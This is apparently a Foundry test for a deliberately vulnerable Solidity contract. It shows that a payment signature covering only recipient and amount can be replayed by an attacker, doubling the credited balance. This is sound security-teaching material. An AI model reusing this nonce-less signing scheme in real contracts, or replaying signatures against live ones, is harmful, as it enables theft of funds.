// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../contracts/vulnerable/vulnerableSignature.sol";
import "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract VulnerableSignatureTest is Test {
    VulnerableSignature vulnerable;

    uint256 private constant PRIVATE_KEY = 0xA11CE;

    address signer;
    address recipient;

    function setUp() public {
        vulnerable = new VulnerableSignature();

        signer = vm.addr(PRIVATE_KEY);
        recipient = makeAddr("recipient");
    }

    function test_ReplayAttackSucceeds() public {
        uint256 amount = 100;

        // Vulnerable implementation signs only recipient and amount.
        bytes32 messageHash = keccak256(
            abi.encode(recipient, amount)
        );

        bytes32 digest =
            MessageHashUtils.toEthSignedMessageHash(messageHash);

        (uint8 v, bytes32 r, bytes32 s) =
            vm.sign(PRIVATE_KEY, digest);

        bytes memory signature = abi.encodePacked(r, s, v);

        address attacker = makeAddr("attacker");

        // First execution.
        vm.prank(attacker);

        vulnerable.executePayment(
            recipient,
            amount,
            signature
        );

        assertEq(vulnerable.balances(recipient), 100);

        // Replay the exact same signature.
        vm.prank(attacker);

        vulnerable.executePayment(
            recipient,
            amount,
            signature
        );

        // The vulnerable contract accepts the replay.
        assertEq(vulnerable.balances(recipient), 200);
    }
}